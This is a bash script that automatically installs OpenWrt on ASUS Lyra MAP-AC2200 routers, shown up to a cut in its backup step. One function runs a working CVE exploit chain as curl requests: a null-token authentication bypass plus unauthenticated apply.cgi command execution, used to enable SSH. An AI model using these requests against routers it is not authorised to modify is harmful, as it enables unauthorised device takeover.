#!/usr/bin/env bash
# flash-openwrt.sh — ASUS Lyra MAP-AC2200 automated OpenWrt installer
#
# Two-stage flash: stock firmware → curl SSH enable → mtd-write initramfs → sysupgrade
#
# IMPROVEMENTS over previous version:
#   - No OEM wizard needed — curl-based SSH enable on factory-default devices
#   - Auto-discovers stock IP (tries common IPs + ARP scan)
#   - Verifies board name before flashing (prevents wrong-device bricks)
#   - MD5 verification on every file transfer
#   - Automatic network reconfiguration between stock and OpenWrt subnets
#   - Saves inventory JSON after successful flash
#
# Prerequisites:
#   - Device factory-reset (hold reset 5 seconds until orange flash, NOT 10+ seconds)
#   - Ethernet connected to EITHER port (script will detect and guide you)
#   - scp -O is used (stock firmware has no sftp-server)
#
# Usage:
#   ./flash-openwrt.sh [OPTIONS]
#
# Options:
#   --target-ip IP        Stock firmware IP (default: auto-detect)
#   --interface IFACE     Network interface (default: auto-detect USB ethernet)
#   --username USER       Stock SSH username (default: admin)
#   --password PASS       Stock SSH password (default: admin — factory default)
#   --initramfs FILE      Path to initramfs.itb (auto-resolve if omitted)
#   --sysupgrade FILE     Path to sysupgrade.bin (auto-resolve if omitted)
#   --openwrt-version VER OpenWrt release (default: 24.10.4)
#   --backup-dir DIR      Directory for MTD partition backups (default: auto from MAC+fw)
#   --no-backup           Skip MTD partition backup
#   --full-backup         Backup ALL MTD partitions (default: critical only)
#   --skip-initramfs      Skip stage 1 (device already running OpenWrt initramfs)
#   --skip-sysupgrade     Skip stage 2 (stop after initramfs boots)
#   --skip-inventory     Skip inventory collection
#   --wifi               Use WiFi STA to connect to stock device (OpenWrt only)
#   --wifi-ssid SSID     Stock device WiFi SSID (default: auto-scan for ASUS_*)
#   --wifi-sta-ip IP     Static IP for STA interface (default: 192.168.72.50)
#   --wifi-target-ip IP  Stock device IP over WiFi (default: 192.168.72.1)
#   -h, --help            Show this help
#
set -euo pipefail
IFS=$'\n\t'

# ─── Defaults ──────────────────────────────────────────────────────
TARGET_IP=""
USERNAME="admin"
PASSWORD="admin"
INITRAMFS=""
SYSUPGRADE=""
OPENWRT_VERSION="24.10.4"
BACKUP_DIR=""
NO_BACKUP=false
FULL_BACKUP=false
INTERFACE=""
SKIP_INITRAMFS=false
SKIP_SYSUPGRADE=false
SKIP_INVENTORY=false
WIFI_MODE=false
WIFI_SSID=""
WIFI_STA_IP="192.168.72.50"
WIFI_TARGET_IP="192.168.72.1"
WIFI_IFACE=""
TARGET="ipq40xx/generic"
DEVICE="asus_map-ac2200"
EXPECTED_BOARD="asus,map-ac2200"
OPENWRT_IP="192.168.1.1"
INVENTORY_SEQ=0
STOCK_PORT_BATCH=0
NEED_PORT_SWITCH=false

# ─── Parse args ────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case "$1" in
    --target-ip)     TARGET_IP="$2"; shift 2 ;;
    --interface)     INTERFACE="$2"; shift 2 ;;
    --username)      USERNAME="$2"; shift 2 ;;
    --password)      PASSWORD="$2"; shift 2 ;;
    --initramfs)     INITRAMFS="$2"; shift 2 ;;
    --sysupgrade)    SYSUPGRADE="$2"; shift 2 ;;
    --openwrt-version) OPENWRT_VERSION="$2"; shift 2 ;;
    --backup-dir)    BACKUP_DIR="$2"; shift 2 ;;
    --no-backup)     NO_BACKUP=true; shift ;;
    --full-backup)   FULL_BACKUP=true; shift ;;
    --skip-initramfs) SKIP_INITRAMFS=true; shift ;;
    --skip-sysupgrade) SKIP_SYSUPGRADE=true; shift ;;
    --skip-inventory) SKIP_INVENTORY=true; shift ;;
    --wifi)           WIFI_MODE=true; shift ;;
    --wifi-ssid)      WIFI_SSID="$2"; shift 2 ;;
    --wifi-sta-ip)    WIFI_STA_IP="$2"; shift 2 ;;
    --wifi-target-ip) WIFI_TARGET_IP="$2"; shift 2 ;;
    -h|--help)
      head -40 "$0" | grep '^#' | sed 's/^# \?//'
      exit 0 ;;
    *) echo "Unknown option: $1" >&2; exit 1 ;;
  esac
done

# ─── Helpers ───────────────────────────────────────────────────────
step() { echo "[$(date +%H:%M:%S)] $*"; }
warn() { echo "[WARN] $*" >&2; }
die() { echo "[ERROR] $*" >&2; exit 1; }
say_msg() { command say "$@" 2>/dev/null || true; }
file_hash() { shasum -a 256 "$1" 2>/dev/null | awk '{print $1}' || sha256sum "$1" 2>/dev/null | awk '{print $1}'; }

run_priv() {
  if [[ "$ON_OPENWRT" == true ]]; then
    "$@"
  else
    sudo "$@"
  fi
}

# Detect if running on OpenWrt
ON_OPENWRT=false
if uname -a 2>/dev/null | grep -qi "OpenWrt\|LEDE"; then
  ON_OPENWRT=true
  step "Running on OpenWrt — using br-lan, Dropbear SSH"
fi

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"

# ─── Auto-detect interface ─────────────────────────────────────────
detect_interface() {
  if [[ -n "$INTERFACE" ]]; then
    step "Using specified interface: $INTERFACE"
    return
  fi

  if [[ "$ON_OPENWRT" == true ]]; then
    INTERFACE="br-lan"
    step "OpenWrt: using br-lan"
    return
  fi

  # macOS: Look for USB ethernet adapters
  for iface in en6 en7 en8 en9 en10; do
    if ifconfig "$iface" &>/dev/null; then
      local media
      media=$(ifconfig "$iface" 2>/dev/null | grep -o 'media:.*' || true)
      if [[ "$media" == *"USB"* ]] || [[ "$media" == *"1000"* ]]; then
        INTERFACE="$iface"
        step "Auto-detected interface: $INTERFACE"
        return
      fi
    fi
  done
  # Fallback: try en6
  if ifconfig en6 &>/dev/null; then
    INTERFACE="en6"
    step "Defaulting to en6"
    return
  fi
  die "Cannot find USB ethernet interface. Use --interface."
}

configure_interface() {
  local ip="$1"
  local netmask="${2:-255.255.255.0}"
  step "Configuring $INTERFACE: ${ip}/${netmask}"
  if [[ "$ON_OPENWRT" == true ]]; then
    ip addr add "${ip}/24" dev "$INTERFACE" 2>/dev/null || true
  else
    run_priv ifconfig "$INTERFACE" "$ip" netmask "$netmask" 2>/dev/null || die "Failed to configure $INTERFACE"
  fi
  sleep 1
}

# ─── WiFi STA scanning and connection (OpenWrt only) ────────────────
wifi_scan_asus() {
  step "Scanning for ASUS stock device WiFi networks..."

  if [[ "$ON_OPENWRT" != true ]]; then
    die "--wifi mode requires running on OpenWrt. Use ethernet from macOS."
  fi

  local sta_iface=""
  for iface in $(iw dev | grep Interface | awk '{print $2}'); do
    if iw dev "$iface" info 2>/dev/null | grep -q "type managed"; then
      sta_iface="$iface"
      break
    fi
  done

  if [[ -z "$sta_iface" ]]; then
    die "No STA (managed) interface found. Ensure radio1 has a wifi-iface with mode='sta'."
  fi

  step "  Scanning on ${sta_iface}..."
  local scan_output
  scan_output=$(iw "${sta_iface}" scan trigger 2>/dev/null; sleep 3; iw "${sta_iface}" scan dump 2>/dev/null || true)

  local asus_ssids
  asus_ssids=$(echo "$scan_output" | grep -B2 -A2 'SSID: ASUS_' | grep 'SSID:' | sed 's/.*SSID: //' | sort -u)

  if [[ -z "$asus_ssids" ]]; then
    die "No ASUS_* WiFi networks found. Ensure stock device is powered on and factory-reset (white LED)."
  fi

  echo "$asus_ssids"
  WIFI_IFACE="$sta_iface"
}

wifi_connect() {
  local ssid="$1"

  step "Connecting to ${ssid} via WiFi STA..."

  local current_ssid
  current_ssid=$(iw "${WIFI_IFACE}" link 2>/dev/null | grep "SSID:" | sed 's/.*SSID: //')
  if [[ "$current_ssid" == "$ssid" ]]; then
    step "  Already connected to ${ssid} — skipping reconfigure"
  else
    local sta_section=""
    for section in $(uci show wireless | grep "mode='sta'" | cut -d. -f2 | cut -d= -f1); do
      sta_section="$section"
      break
    done

    if [[ -z "$sta_section" ]]; then
      die "No STA wifi-iface section found in uci wireless config."
    fi

    step "  Configuring wireless.${sta_section} → SSID: ${ssid}, encryption: none"
    uci set "wireless.${sta_section}.ssid=${ssid}"
    uci set "wireless.${sta_section}.encryption=none"
    uci commit wireless
    wifi reload 2>/dev/null

    step "  Waiting for WiFi connection (up to 30s)..."
    local connected=false
    for i in $(seq 1 30); do
      if iw "${WIFI_IFACE}" link 2>/dev/null | grep -q "Connected"; then
        local signal
        signal=$(iw "${WIFI_IFACE}" link 2>/dev/null | grep "signal:" | awk '{print $2}')
        step "  Connected! Signal: ${signal} dBm"
        connected=true
        break
      fi
      sleep 1
    done

    if [[ "$connected" != true ]]; then
      die "Failed to connect to ${ssid} within 30s. Check: stock device powered on? Factory reset?"
    fi
  fi

  step "  Setting static IP ${WIFI_STA_IP}/24 on ${WIFI_IFACE}..."
  ip addr add "${WIFI_STA_IP}/24" dev "${WIFI_IFACE}" 2>/dev/null || true
  sleep 2

  step "  Verifying connectivity to ${WIFI_TARGET_IP}..."
  if ! ping -c 2 -W 3 "${WIFI_TARGET_IP}" &>/dev/null; then
    die "Cannot reach ${WIFI_TARGET_IP} over WiFi. Check stock device IP."
  fi
  step "  WiFi link established: ${WIFI_STA_IP} ↔ ${WIFI_TARGET_IP} ✓"

  TARGET_IP="${WIFI_TARGET_IP}"
  say_msg "WiFi connected to stock device."
}

# ─── Semi-automated port discovery ─────────────────────────────────
discover_lan_port() {
  step "Discovering which port is stock LAN (listening for device broadcasts)..."

  # Configure both common subnets
  run_priv ifconfig "$INTERFACE" 192.168.72.2 netmask 255.255.255.0 2>/dev/null
  run_priv ifconfig "$INTERFACE" alias 192.168.1.2 netmask 255.255.255.0 2>/dev/null
  sleep 2

  # Get our MAC for filtering
  local our_mac
  our_mac=$(ifconfig "$INTERFACE" 2>/dev/null | grep -o 'ether [0-9a-f:]*' | awk '{print $2}')

  # Listen for device traffic (15 seconds)
  step "Listening on $INTERFACE for device broadcasts (15s)..."
  local traffic
  traffic=$(run_priv timeout 15 tcpdump -i "$INTERFACE" -c 3 -n -e \
    "(stp or llpd or ssdp or port 67 or port 68 or ether proto 0x88cc)" \
    2>/dev/null | grep -v "$our_mac" | head -3 || true)

  if [[ -n "$traffic" ]]; then
    local dev_mac
    dev_mac=$(echo "$traffic" | head -1 | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
    step "Device detected on current port! MAC: ${dev_mac:-unknown}"
    say_msg "Device found. Starting flash."

    # Detect batch from MAC OUI
    if [[ -n "$dev_mac" ]]; then
      local oui
      oui=$(echo "$dev_mac" | cut -d: -f1-3)
      case "$oui" in
        "10:7b:44"|"04:d4:c4"|"1c:b7:2c"|"2c:fd:af")
          step "Batch 1 detected (OUI: $oui) — stock LAN = middle port"
          STOCK_PORT_BATCH=1
          ;;
        "2c:fd:a1")
          step "Batch 2 detected (OUI: $oui) — stock LAN = far port"
          STOCK_PORT_BATCH=2
          ;;
        *)
          step "Unknown OUI: $oui — proceeding with current port"
          STOCK_PORT_BATCH=0
          ;;
      esac
    fi

    discover_stock_ip
    return 0
  fi

  # No traffic — ask user to move cable
  step "No device traffic detected on current port."
  step "The stock LAN port may be on the OTHER ethernet port."
  say_msg "Please move the cable to the other ethernet port. Then press enter."
  echo ""
  echo "  ┌─────────────────────────────────────────────────────────┐"
  echo "  │  MOVE CABLE: Unplug from current port, plug into the    │"
  echo "  │  OTHER ethernet port on the Lyra device.                │"
  echo "  │                                                         │"
  echo "  │  Middle port (near power) ←→ Far port (away from power) │"
  echo "  │                                                         │"
  echo "  │  Press ENTER when cable is moved...                     │"
  echo "  └─────────────────────────────────────────────────────────┘"
  read -r

  # Re-configure interface after cable move
  run_priv ifconfig "$INTERFACE" 192.168.72.2 netmask 255.255.255.0 2>/dev/null
  run_priv ifconfig "$INTERFACE" alias 192.168.1.2 netmask 255.255.255.0 2>/dev/null
  sleep 3

  # Listen again
  step "Listening again on $INTERFACE (15s)..."
  traffic=$(run_priv timeout 15 tcpdump -i "$INTERFACE" -c 3 -n -e \
    "(stp or llpd or ssdp or port 67 or port 68 or ether proto 0x88cc)" \
    2>/dev/null | grep -v "$our_mac" | head -3 || true)

  if [[ -n "$traffic" ]]; then
    local dev_mac
    dev_mac=$(echo "$traffic" | head -1 | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
    step "Device detected on other port! MAC: ${dev_mac:-unknown}"
    say_msg "Device found on second port. Starting flash."

    if [[ -n "$dev_mac" ]]; then
      local oui
      oui=$(echo "$dev_mac" | cut -d: -f1-3)
      case "$oui" in
        "10:7b:44"|"04:d4:c4"|"1c:b7:2c"|"2c:fd:af")
          step "Batch 1 detected (OUI: $oui)"
          STOCK_PORT_BATCH=1
          ;;
        "2c:fd:a1")
          step "Batch 2 detected (OUI: $oui) — will need cable move back to middle port after initramfs"
          STOCK_PORT_BATCH=2
          NEED_PORT_SWITCH=true
          ;;
        *)
          step "Unknown OUI: $oui"
          STOCK_PORT_BATCH=0
          ;;
      esac
    fi

    discover_stock_ip
    return 0
  fi

  die "No device detected on either port. Check: (1) device powered on? (2) white LED (factory default)? (3) try factory reset (hold reset 5 seconds)?"
}

# ─── Auto-discover stock IP ────────────────────────────────────────
discover_stock_ip() {
  if [[ -n "$TARGET_IP" ]]; then
    step "Using specified target IP: $TARGET_IP"
    return
  fi

  step "Auto-discovering device IP..."

  # Common ASUS stock IPs to try
  local stock_ips=("192.168.1.1" "192.168.72.1" "192.168.2.1" "192.168.0.1" "10.0.0.1" "192.168.50.1")
  local found=""

  # Try each IP on both common subnets
  for test_ip in "${stock_ips[@]}"; do
    local subnet
    subnet=$(echo "$test_ip" | cut -d. -f1-3)
    local our_ip="${subnet}.2"

    configure_interface "$our_ip"

    if ping -c 1 -W 2 "$test_ip" &>/dev/null; then
      # Verify it's actually an ASUS device
      local server
      server=$(curl -sI --max-time 3 "http://${test_ip}/" 2>/dev/null | grep -i "^Server:" | tr -d '\r' || true)
      if [[ "$server" == *"httpd"* ]] || [[ "$server" == *"ASUS"* ]]; then
        found="$test_ip"
        step "Found ASUS device at ${test_ip} (Server: ${server:-unknown})"
        break
      fi
      # Even without httpd header, if it responds it might be our device
      if curl -s --max-time 3 "http://${test_ip}/" 2>/dev/null | grep -qi "asus\|lyra\|router"; then
        found="$test_ip"
        step "Found ASUS device at ${test_ip} (page content match)"
        break
      fi
    fi
  done

  if [[ -z "$found" ]]; then
    # Try ARP scan as last resort
    step "IP probing failed. Trying ARP scan..."
    for test_ip in "${stock_ips[@]}"; do
      local subnet
      subnet=$(echo "$test_ip" | cut -d. -f1-3)
      configure_interface "${subnet}.2"
      ping -c 1 -W 1 "$test_ip" &>/dev/null || true
    done
    sleep 2
    local arp_entry
    arp_entry=$(run_priv arp -a 2>/dev/null | grep "$INTERFACE" | grep -v incomplete | head -1 || true)
    if [[ -n "$arp_entry" ]]; then
      found=$(echo "$arp_entry" | awk '{print $2}' | tr -d '()')
      step "Found device via ARP: ${found}"
    fi
  fi

  if [[ -z "$found" ]]; then
    die "Cannot discover device IP. Try --target-ip or check: (1) device powered on? (2) factory reset? (3) cable on middle/LAN port?"
  fi

  TARGET_IP="$found"
  step "Target IP: ${TARGET_IP}"
}

# ─── Curl-based SSH enable via CVE chain (no wizard needed) ──────────
# CVE-2021-32030: null-byte asus_token bypass (affects Lyra firmware 3.0.0.4.384_46630)
# CVE-2018-5999: apply.cgi processes POST without auth
# CVE-2016-6558: action_script command injection in apply.cgi
enable_ssh_cve() {
  local ip="$1"
  step "Enabling SSH via CVE chain (factory-default, no wizard needed)..."

  # CVE-2021-32030: Send asus_token starting with null byte + asusrouter-- user-agent
  # This bypasses auth because strcmp(null_token, ifttt_token_default_null) matches
  step "  [CVE-2021-32030] Auth bypass via null asus_token..."
  local token_bypass
  token_bypass=$(curl -s --max-time 10 \
    -b "asus_token=%00" \
    -A "asusrouter--" \
    -H "Referer: http://${ip}/QIS_wizard.htm" \
    -o /dev/null -w "%{http_code}" \
    "http://${ip}/" || true)

  if [[ "$token_bypass" != "200" && "$token_bypass" != "302" ]]; then
    warn "  Null-token auth bypass returned HTTP ${token_bypass:-none} (expected 200/302)"
  fi

  # CVE-2018-5999 + CVE-2016-6558: apply.cgi executes action_script without auth
  # sshd_enable=1 enables SSH on all interfaces, restart_sshd starts the daemon
  step "  [CVE-2018-5999] Enabling SSH via apply.cgi (action_script)..."
  local apply_result
  apply_result=$(curl -s --max-time 10 \
    -X POST \
    -b "asus_token=%00" \
    -A "asusrouter--" \
    -H "Referer: http://${ip}/QIS_wizard.htm" \
    -d "action_mode=apply&action_script=restart_sshd&sshd_enable=1" \
    "http://${ip}/apply.cgi" || true)

  step "  SSH enable command sent. Waiting 5s for sshd..."
  sleep 5

  # Alternative method: use start_apply.htm with null token
  # (some firmware versions respond better to GET with query params)
  step "  Confirming SSH enable via start_apply.htm..."
  curl -s --max-time 10 \
    -b "asus_token=%00" \
    -A "asusrouter--" \
    -H "Referer: http://${ip}/QIS_wizard.htm" \
    "http://${ip}/start_apply.htm?sshd_enable=1&action_mode=apply&action_script=restart_sshd&action_wait=5" \
    || true

  step "  Waiting 3s..."
  sleep 3
  return 0
}

# ─── Legacy wizard-dependent SSH enable (fallback) ─────────────────
enable_ssh_wizard() {
  local ip="$1"
  step "Trying legacy SSH enable (requires wizard-completed device)..."

  local token_response
  token_response=$(curl -s --max-time 10 -c - "http://${ip}/" || true)
  local token
  token=$(echo "$token_response" | grep "asus_token" | awk '{print $NF}' | tr -d ';' || true)

  if [[ -z "$token" ]]; then
    token=$(curl -s --max-time 10 -D - "http://${ip}/" | grep -i "Set-Cookie.*asus_token" | sed 's/.*asus_token=//' | cut -d';' -f1 || true)
  fi

  if [[ -z "$token" ]]; then
    warn "Could not extract asus_token. Device may not have wizard completed."
    return 1
  fi

  step "  Token obtained: ${token:0:8}..."
  curl -s --max-time 10 \
    -b "asus_token=${token}" \
    -H "Referer: http://${ip}/QIS_wizard.htm" \
    "http://${ip}/start_apply.htm?sshd_enable=1&action_mode=apply&action_script=restart_sshd&action_wait=5" \
    || true

  step "  SSH enable command sent. Waiting 5s..."
  sleep 5
  return 0
}

# ─── Combined SSH enable (CVE first, wizard fallback) ──────────────
enable_ssh() {
  local ip="$1"
  if ! enable_ssh_cve "$ip"; then
    warn "CVE chain failed, trying wizard method..."
    enable_ssh_wizard "$ip" || return 1
  fi
}

# ─── HTTP-based device fingerprint (before SSH) ─────────────────────
fingerprint_http() {
  local ip="$1"
  step "Fingerprinting device at ${ip}..."

  local server model_str fw_str redirect html_snippet

  server=$(curl -sI --max-time 5 "http://${ip}/" 2>/dev/null | grep -i "^Server:" | tr -d '\r' || true)

  redirect=$(curl -sI --max-time 5 "http://${ip}/" 2>/dev/null | grep -i "^Location:" | tr -d '\r' || true)

  html_snippet=$(curl -s --max-time 5 "http://${ip}/" 2>/dev/null | head -50 || true)

  local fingerprint="{"
  fingerprint+=" server:\"${server:-none}\""

  if [[ "$server" == *"httpd/2.0"* ]]; then
    fingerprint+=" vendor:ASUS"
    fingerprint+=" firmware_type:stock_asus"

    if [[ "$redirect" == *"QIS_wizard"* ]] || [[ "$html_snippet" == *"QIS_wizard"* ]]; then
      fingerprint+=" state:factory_default"
      fingerprint+=" install_method:cve_chain_no_wizard"
    elif [[ "$redirect" == *"Main_Login"* ]] || [[ "$html_snippet" == *"Main_Login"* ]]; then
      fingerprint+=" state:wizard_completed"
      fingerprint+=" install_method:cve_chain_or_ssh"
    else
      fingerprint+=" state:unknown"
      fingerprint+=" install_method:cve_chain"
    fi

    local asus_model
    asus_model=$(echo "$html_snippet" | sed -n 's/.*productid[^"]*"\([^"]*\)".*/\1/p' | head -1 || true)
    if [[ -n "$asus_model" ]]; then
      fingerprint+=" model_hint:${asus_model}"
    fi

    if [[ "$html_snippet" == *"Lyra"* ]] || [[ "$html_snippet" == *"MAP-AC2200"* ]]; then
      fingerprint+=" device:lyra_map-ac2200"
    fi

  elif [[ "$server" == *"uhttpd"* ]] || [[ "$server" == *"LuCI"* ]]; then
    fingerprint+=" vendor:OpenWrt"
    fingerprint+=" firmware_type:openwrt"
    fingerprint+=" install_method:sysupgrade"

    local owrt_release
    owrt_release=$(curl -s --max-time 5 "http://${ip}/cgi-bin/luci/admin/status/overview" 2>/dev/null | grep -o "OpenWrt [0-9.]+" | head -1 || true)
    if [[ -n "$owrt_release" ]]; then
      fingerprint+=" openwrt_version:${owrt_release}"
    fi

  else
    fingerprint+=" vendor:unknown"
    fingerprint+=" firmware_type:unknown"
    fingerprint+=" install_method:manual_investigation"
  fi

  fingerprint+=" }"
  echo "$fingerprint"
  step "  Fingerprint: ${fingerprint}"
}

# ─── Device confirmation (prevents wrong-device bricks) ─────────────
confirm_device() {
  local ip="$1"
  local ssh_cmd="$2"

  step "Confirming device identity..."
  local board fw_ver mac model
  board=$(eval "$ssh_cmd" "cat /tmp/sysinfo/board_name 2>/dev/null || echo unknown" 2>/dev/null || echo "ssh-failed")
  fw_ver=$(eval "$ssh_cmd" "nvram get buildno 2>/dev/null || echo unknown" 2>/dev/null || echo "unknown")
  fw_ext=$(eval "$ssh_cmd" "nvram get extendno 2>/dev/null || echo unknown" 2>/dev/null || echo "unknown")
  mac=$(eval "$ssh_cmd" "cat /sys/class/net/br0/address 2>/dev/null || ifconfig br0 2>/dev/null | grep -o 'HWaddr .*' | awk '{print \$2}'" 2>/dev/null || echo "unknown")
  model=$(eval "$ssh_cmd" "nvram get productid 2>/dev/null || echo unknown" 2>/dev/null || echo "unknown")

  echo ""
  echo "  ┌──────────────────────────────────────────────────────────┐"
  echo "  │  DEVICE DETECTED — Confirm before flashing:              │"
  echo "  │                                                          │"
  echo "  │  Model:    ${model}                                    "
  echo "  │  Board:    ${board}                                    "
  echo "  │  MAC:      ${mac}                                     "
  echo "  │  Firmware: ${fw_ver} (${fw_ext})                       "
  echo "  │                                                          │"
  echo "  │  WARNING: This will FLASH OpenWrt to this device!       │"
  echo "  │  Type 'yes' to confirm, anything else to abort.         │"
  echo "  └──────────────────────────────────────────────────────────┘"
  echo ""

  read -rp "  Flash this device? [yes/N] " confirm
  [[ "$confirm" == "yes" ]] || die "Aborted by user."
  step "Confirmed. Proceeding with flash..."
}

# ─── Verify board identity (prevents wrong-device bricks) ──────────
verify_board() {
  local ip="$1"
  local expected="$2"
  local ssh_cmd="$3"

  step "Verifying device identity..."
  local board
  board=$(eval "$ssh_cmd" "cat /tmp/sysinfo/board_name 2>/dev/null || echo unknown" 2>/dev/null || echo "ssh-failed")

  if [[ "$board" == "$expected" ]]; then
    step "  Board verified: ${board} ✓"
    return 0
  fi

  if [[ "$board" == "ssh-failed" ]] || [[ "$board" == "unknown" ]]; then
    warn "  Could not read board name via SSH. Skipping verification."
    warn "  THIS IS RISKY — you may be flashing the wrong device."
    read -rp "  Continue anyway? [y/N] " confirm
    [[ "$confirm" == "y" || "$confirm" == "Y" ]] || die "Aborted."
    return 0
  fi

  die "Board mismatch! Expected '${expected}', got '${board}'. Refusing to flash — wrong device."
}

# ─── File integrity verification ────────────────────────────────────
verify_file() {
  local local_file="$1"
  local remote_cmd="$2"
  local desc="$3"

  local local_hash
  local_hash=$(file_hash "$local_file")
  if [[ -z "$local_hash" ]]; then
    warn "Could not compute local hash for ${desc}"
    return
  fi

  step "  Verifying ${desc} SHA256..."
  local remote_hash
  remote_hash=$(eval "$remote_cmd" 2>/dev/null || true)
  remote_hash=$(echo "$remote_hash" | awk '{print $1}')

  if [[ "$local_hash" == "$remote_hash" ]]; then
    step "  SHA256 verified: ${local_hash:0:16}... ✓"
  else
    die "SHA256 mismatch for ${desc}! Local: ${local_hash:0:16}..., Remote: ${remote_hash:0:16}... File corruption during transfer."
  fi
}

# ─── Resolve firmware files ───────────────────────────────────────
BASE_URL="https://downloads.openwrt.org/releases/${OPENWRT_VERSION}/targets/${TARGET}"
INITRAMFS_URL="${BASE_URL}/openwrt-${OPENWRT_VERSION}-${TARGET//\//-}-${DEVICE}-initramfs-uImage.itb"
SYSUPGRADE_URL="${BASE_URL}/openwrt-${OPENWRT_VERSION}-${TARGET//\//-}-${DEVICE}-squashfs-sysupgrade.bin"

resolve_file() {
  local name="$1" path="$2" url="$3"
  if [[ -n "$path" && -f "$path" ]]; then
    echo "$path"
  elif [[ -f "$(basename "$url")" ]]; then
    echo "$(basename "$url")"
  elif [[ -f "firmware/$(basename "$url")" ]]; then
    echo "firmware/$(basename "$url")"
  elif [[ -f "../../firmware/$(basename "$url")" ]]; then
    echo "../../firmware/$(basename "$url")"
  elif [[ -f "/Users/macbook/src/conwrt/firmware/$(basename "$url")" ]]; then
    echo "/Users/macbook/src/conwrt/firmware/$(basename "$url")"
  else
    step "Downloading ${name}..."
    curl -fL --progress-bar -o "$(basename "$url")" "$url" || die "Download failed: ${url}"
    echo "$(basename "$url")"
  fi
}

INITRAMFS=$(resolve_file "initramfs" "$INITRAMFS" "$INITRAMFS_URL")
SYSUPGRADE=$(resolve_file "sysupgrade" "$SYSUPGRADE" "$SYSUPGRADE_URL")

step "Initramfs: $(ls -lh "$INITRAMFS" | awk '{print $5}') (SHA256: $(file_hash "$INITRAMFS" | cut -c1-12)...)"
step "Sysupgrade: $(ls -lh "$SYSUPGRADE" | awk '{print $5}') (SHA256: $(file_hash "$SYSUPGRADE" | cut -c1-12)...)"

# ─── Detect interface (skip in WiFi mode) ───────────────────────────
if [[ "$WIFI_MODE" != true ]]; then
  detect_interface
fi

# ─── Discover device (WiFi or ethernet) ────────────────────────────
if [[ "$WIFI_MODE" == true ]]; then
  step "=== WiFi installation mode ==="
  if [[ -n "$WIFI_SSID" ]]; then
    step "Using specified SSID: ${WIFI_SSID}"
    WIFI_IFACE=""
    for iface in $(iw dev | grep Interface | awk '{print $2}'); do
      if iw dev "$iface" info 2>/dev/null | grep -q "type managed"; then
        WIFI_IFACE="$iface"
        break
      fi
    done
    [[ -n "$WIFI_IFACE" ]] || die "No STA interface found for --wifi mode."
  else
    found_ssids=$(wifi_scan_asus)
    ssid_count=$(echo "$found_ssids" | wc -l | tr -d ' ')
    if [[ "$ssid_count" -gt 1 ]]; then
      step "Multiple ASUS networks found:"
      echo "$found_ssids" | nl -ba -s') '
      read -rp "  Select SSID number [1-${ssid_count}]: " pick
      WIFI_SSID=$(echo "$found_ssids" | sed -n "${pick}p")
    else
      WIFI_SSID=$(echo "$found_ssids" | head -1)
    fi
  fi
  wifi_connect "$WIFI_SSID"
elif [[ "$SKIP_INITRAMFS" == false ]]; then
  discover_lan_port
fi

# ─── Detect firmware type ──────────────────────────────────────────
step "Detecting firmware type..."
HTTP_SERVER=$(curl -sI --max-time 10 "http://${TARGET_IP:-$OPENWRT_IP}/" 2>/dev/null | grep -i "^Server:" | tr -d '\r' || true)
if [[ "$HTTP_SERVER" == *"httpd"* ]]; then
  step "Stock ASUS firmware detected (httpd/2.0)"
  IS_OPENWRT=false
elif [[ "$HTTP_SERVER" == *"LuCI"* ]] || [[ "$HTTP_SERVER" == *"uhttpd"* ]]; then
  step "OpenWrt detected"
  IS_OPENWRT=true
elif [[ "$SKIP_INITRAMFS" == true ]]; then
  step "Assuming OpenWrt (--skip-initramfs specified)"
  IS_OPENWRT=true
else
  step "Unknown firmware (Server: ${HTTP_SERVER:-none}), assuming stock"
  IS_OPENWRT=false
fi

if [[ -n "${TARGET_IP:-}" && "$IS_OPENWRT" != true ]]; then
  fingerprint_http "${TARGET_IP}"
fi

# ─── Stage 1: Stock SSH → mtd-write initramfs ─────────────────────
if [[ "$SKIP_INITRAMFS" == true ]]; then
  step "Skipping stage 1 (--skip-initramfs)"
elif [[ "$IS_OPENWRT" == true ]]; then
  step "Device already running OpenWrt, skipping stage 1"
else
  step "=== STAGE 1: Write initramfs via stock SSH ==="

  # Try to enable SSH via CVE chain (factory-default, no wizard needed)
  if ! enable_ssh "$TARGET_IP"; then
    warn "All SSH enable methods failed — device may need wizard completion or SSH already enabled"
  fi

  # Check SSH connectivity
  step "Testing SSH access..."
  if sshpass -p "$PASSWORD" ssh $SSH_OPTS "${USERNAME}@${TARGET_IP}" 'echo ok' 2>/dev/null | grep -q ok; then
    step "SSH access confirmed (password: ${PASSWORD})"
    SSH_CMD="sshpass -p '${PASSWORD}' ssh $SSH_OPTS ${USERNAME}@${TARGET_IP}"
    SCP_CMD="sshpass -p '${PASSWORD}' scp -O $SSH_OPTS"
  elif ssh $SSH_OPTS -o BatchMode=yes "${USERNAME}@${TARGET_IP}" 'echo ok' 2>/dev/null | grep -q ok; then
    step "SSH access confirmed (key auth)"
    SSH_CMD="ssh $SSH_OPTS ${USERNAME}@${TARGET_IP}"
    SCP_CMD="scp -O $SSH_OPTS"
  else
    die "SSH access failed. Password may not be '${PASSWORD}'. Use --password flag. Device may need factory reset."
  fi

  # ─── Verify board identity ──────────────────────────────────────
  verify_board "$TARGET_IP" "$EXPECTED_BOARD" "$SSH_CMD"

  # ─── Confirm device with operator before flashing ──────────────
  confirm_device "$TARGET_IP" "$SSH_CMD"

  # ─── Discover device identity for backup naming ─────────────────
  if [[ "$NO_BACKUP" != true ]]; then
    DEVICE_MAC=$(eval "$SSH_CMD" "cat /sys/class/net/eth0/address 2>/dev/null || ifconfig eth0 2>/dev/null | grep -o 'HWaddr .*' | awk '{print \$2}'" 2>/dev/null || echo "unknown")
    DEVICE_MAC=$(echo "$DEVICE_MAC" | tr -d '[:space:]' | tr ':' '-')
    STOCK_FW=$(eval "$SSH_CMD" "nvram get buildno 2>/dev/null || echo unknown" 2>/dev/null)
    STOCK_FW_FULL=$(eval "$SSH_CMD" "nvram get extendno 2>/dev/null || echo unknown" 2>/dev/null)
    BACKUP_DIR="${BACKUP_DIR:-backups/asus-lyra-map-ac2200-mac-${DEVICE_MAC}-fw-${STOCK_FW}}"
    mkdir -p "$BACKUP_DIR"
    step "Device MAC: ${DEVICE_MAC}, Stock FW: ${STOCK_FW} (${STOCK_FW_FULL})"
    step "Backing up MTD partitions to ${BACKUP_DIR}/..."

    MTD_INFO=$(eval "$SSH_CMD" "cat /proc/mtd" 2>/dev/null || true)
